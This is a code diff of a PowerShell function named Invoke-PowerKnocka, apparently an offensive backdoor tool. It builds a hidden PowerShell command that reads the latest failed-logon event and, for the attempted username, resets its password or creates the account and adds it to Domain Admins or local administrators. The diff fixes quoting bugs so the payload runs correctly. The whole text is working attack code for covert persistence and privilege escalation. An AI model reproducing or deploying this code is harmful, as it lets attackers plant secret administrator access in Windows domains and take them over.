@@ -18,19 +18,20 @@ function Invoke-PowerKnocka {
         [string]$Password = "Password1!qazwsx",
 
         [Parameter(Mandatory)]
-        [bool]$DC,
+        [switch]$DC,
 
         [Parameter(Mandatory=$false)]
         [bool]$ClearLog = $false,
 
-        [Parameter(Mandatory)]
-        [bool]$NBName,
+        [Parameter(Mandatory=$false)]
+        [string]$NBName,
 
+        [Parameter(Mandatory=$false)]
         [bool]$SSH = $false
     )
 
     if ($DC) {
-        $ExploitString = '-WindowStyle Hidden -NoP -NonI $e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq' + $NBName + ') {try{ Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText ' + $Password + '-Force)} catch { New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString ' + $Password + 'AsPlainText -force);Add-ADGroupMember -Identity "Domain Admins" -Members $n}}'
+        $ExploitString = '-WindowStyle Hidden -NoP -NonI $e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq ' + $NBName + ') {try{ Set-ADAccountPassword -Identity $n -Reset -NewPassword (ConvertTo-SecureString -AsPlainText ' + $Password + ' -Force)} catch { New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString ' + $Password + ' -AsPlainText -force);Add-ADGroupMember -Identity "Domain Admins" -Members $n}}'
     }
     else {
         $ExploitString = '-WindowStyle Hidden -NoP -NonI $e = Get-EventLog -LogName Security -InstanceId 4625 -Newest 1; $n = $e.ReplacementStrings[5];if ($e.ReplacementStrings[6] -eq ' + $NBName + ') {if (net user $n) {net user $n ' + $Password + '} else {net user $n ' + $Password + ' /add;net localgroup administrators $n /add}}'
